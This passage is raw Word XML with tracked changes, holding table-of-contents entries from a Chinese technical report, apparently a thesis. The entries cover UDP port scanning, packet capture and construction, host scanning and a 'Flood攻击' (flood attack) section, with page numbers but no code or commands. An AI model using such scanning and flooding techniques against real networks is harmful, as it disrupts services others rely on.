            <w:delText>5.2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UDP端口扫描</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>31</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0D4490EA" w14:textId="56E39BC8" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="483" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="484" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="485" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="486" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>5.2.1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网卡选择</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>31</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1A7815E9" w14:textId="3B10AD42" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="487" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="488" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="489" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="490" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>5.2.2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网卡信息获取</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>31</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0BED4844" w14:textId="7E3B3FFD" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="491" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="492" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="493" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="494" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>5.2.3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数据包的捕获</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>32</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="28FA0A28" w14:textId="0BB7DC83" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="495" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="496" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="497" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="498" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>5.2.4</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MAC地址获取</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>34</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1B6475E1" w14:textId="4D790A74" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="499" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="500" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="501" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="502" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>5.2.5</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数据包的构建</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>36</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="780AE7F1" w14:textId="04C8469B" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="503" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="504" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="505" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="506" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>5.2.6</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数据包的发送</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>39</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5570F306" w14:textId="2D8318DA" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="507" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="508" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="509" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="510" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>5.3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 Flood攻击</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>40</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="69280B5D" w14:textId="12C24A3B" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="511" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="512" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="513" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="514" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>5.3.1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UDP数据包的构建</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>40</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4048D4FD" w14:textId="4CF13AE1" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="515" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="516" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="517" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="518" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>5.3.2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UDP数据包的发送</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>42</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="451FBE75" w14:textId="487B5813" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="519" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="520" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="521" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="522" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>5.3.3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 Flood攻击</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>43</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6DDA7275" w14:textId="5155B238" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="523" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="524" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="525" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="526" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>5.4</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
              <w:noProof/>
              <w:sz w:val="21"/>
              <w:szCs w:val="22"/>
            </w:rPr>
            <w:tab/>
          </w:r>
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>本章小结</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>43</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7065D82E" w14:textId="6FA0C1E5" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="420"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:ins w:id="527" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="528" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="529" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="530" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>6.</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环境搭建及测试</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>44</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0E234949" w14:textId="0B83C810" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="531" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="532" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="533" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="534" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>6.1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开发环境</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>44</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7ABF30A2" w14:textId="371D72A1" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="535" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="536" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="537" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="538" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>6.2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测试环境</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>45</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="13B9C31F" w14:textId="1D6F986A" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="539" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="540" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="541" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="542" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>6.3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程序测试</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>45</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="587F30EF" w14:textId="27F16B53" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="543" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="544" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="545" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="546" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>6.3.1</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选择网卡</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>45</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="22853544" w14:textId="6B0CD97F" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="547" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="548" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="549" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="550" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>6.3.2</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主机扫描</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>46</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6B592F84" w14:textId="5B75F944" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="551" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="552" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="553" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="554" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
